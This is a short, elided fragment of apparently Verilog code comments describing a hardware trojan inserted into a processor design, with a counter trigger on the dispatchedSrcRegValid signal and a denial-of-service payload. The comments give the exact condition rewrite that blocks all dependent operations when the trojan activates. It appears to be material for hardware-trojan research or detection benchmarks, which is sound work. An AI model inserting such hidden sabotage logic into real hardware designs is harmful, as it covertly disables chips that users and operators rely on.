 ...
 * 
 * Description:
 *   Disables operations by blocking dispatchedSrcRegValid control signal
 *   
 * Trigger: Counter on dispatchedSrcRegValid
 * Payload: Block dispatchedSrcRegValid when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block dispatchedSrcRegValid when trojan is active
//
// IMPORTANT: dispatchedSrcRegValid is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (dispatchedSrcRegValid && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: dispatchedSrcRegValid && 0 = 0 (always false)
//   All operations controlled by dispatchedSrcRegValid are blocked
